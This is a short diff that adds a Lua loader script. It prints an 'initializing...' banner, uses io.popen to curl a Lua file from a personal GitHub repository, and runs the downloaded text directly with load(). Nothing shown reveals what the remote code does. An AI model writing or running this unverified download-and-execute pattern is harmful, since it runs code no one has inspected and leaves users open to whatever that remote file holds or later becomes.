@@ -1,0 +1,6 @@
+
+print("\27[93minitializing...")
+local ss = io.popen("curl -s https://raw.githubusercontent.com/nathanc0dxxx-cpu/DTD/main/DTDBTS.lua")
+local c = ss:read("*a") ss:close()
+if c then load(c)() else print("\27[91mfailed to load...") end
+
